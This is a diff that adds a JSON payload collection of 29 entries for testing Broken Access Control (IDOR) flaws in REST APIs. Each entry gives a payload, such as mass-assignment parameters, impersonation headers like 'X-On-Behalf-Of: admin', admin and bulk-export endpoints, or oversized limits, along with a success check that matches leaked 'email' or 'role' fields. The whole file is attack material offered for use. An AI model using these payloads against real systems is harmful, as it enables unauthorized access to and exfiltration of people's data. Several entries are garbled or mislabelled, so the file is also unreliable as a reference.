@@ -1,0 +1,321 @@
+[
+  {
+    "payload_id": "OWP-1684",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?user_id=1&role=admin (mass assignment)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1685",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "X-Original-User: 101 (header IDOR)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1686",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "X-On-Behalf-Of: admin (header impersonation)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1687",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "{\"user_id\":1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1688",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "\"action\":\"delete\"} (arbitrary user action)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1689",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?include_deleted=true (soft delete bypass)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1690",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?show_all=true (show all records)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1691",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?admin=false (toggle admin)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1692",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?bypass=true (bypass check)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1693",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?is_admin=1 (self-claim admin)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1694",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?limit=999999 (mass disclosure)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1695",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "sort by \"password\" in SQL (data leak)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1696",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?export=all&format=json (bulk export)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1697",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?include=roles",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1698",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "permissions (expand scope)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1699",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?fields[]=email&fields[]=ssn (field filtering abuse)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1700",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?deep=true (deep object retrieval)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1701",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?recursive=true (recursive disclosure)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1702",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "?children=true (child objects)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1703",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/admin/users/all/export",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1704",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/internal/users/search?q=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1705",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/users/admin?role=admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1706",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/users/superadmin?permissions=all",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1707",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/impersonate?user=admin_001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1708",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/v1/organizations/1/members",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1709",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/v1/companies/1/employees",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1710",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/customers/export?format=csv",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1711",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/admin/config/export?type=backup",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-1712",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "query_parameter",
+    "payload_string": "/api/audit/logs/export?range=all",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  }
+]
